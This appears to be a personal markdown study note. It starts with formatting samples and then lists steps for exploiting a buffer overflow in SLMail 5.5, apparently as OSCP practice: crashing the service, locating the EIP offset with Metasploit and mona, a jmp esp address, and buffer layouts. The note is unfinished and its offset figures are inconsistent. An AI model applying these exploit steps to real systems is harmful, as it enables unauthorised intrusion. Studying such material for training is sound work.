Note 1


`method is new`

*bold*
**bold**
***bold***

```python
s = "Python syntax highlighting"
print s
``` 

**As Grace Hopper said:**
> I’ve always been more interested 
> in the future than in the past.

https://github.com/hyperreality/OSCP-Buffer-Overflow-in-30-minutes
https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/buffer-overflow
(SLMail 5.5) using jmp esp at 5f4a358f
man asci    i

## 1. Find bytes needed to crash service
    use python module: exam01.py
    Note: bytes = 3000

## 2. Pattern create for finding exact spot
    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
    !mona pc 3000

### use python module: exam02.py
Note: EIP = 6E42366E

3. Pattern_offset - Find Offset of EIP in Buffer
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 39694438
!mona po <EIP number> e.g. 6E42366E
Note: exact match at offset = 1189

3b. Verify
Verify exact location of EIP - [\*] Exact match at offset 1189
buffer = "A" \* 1189 + "B" \* 4 + "C" \* 90
Total = 3000, where slmail crashed

use python module: exam03.py
!mona suggest

3c. Determine max buffer
use python module: 3-jk_poc02.py
Send an extra large buffer
buffer = "A" * 2606 + "B" * 4 + "C" * (3500 – 2606 - 4)
Note: 429 bytes free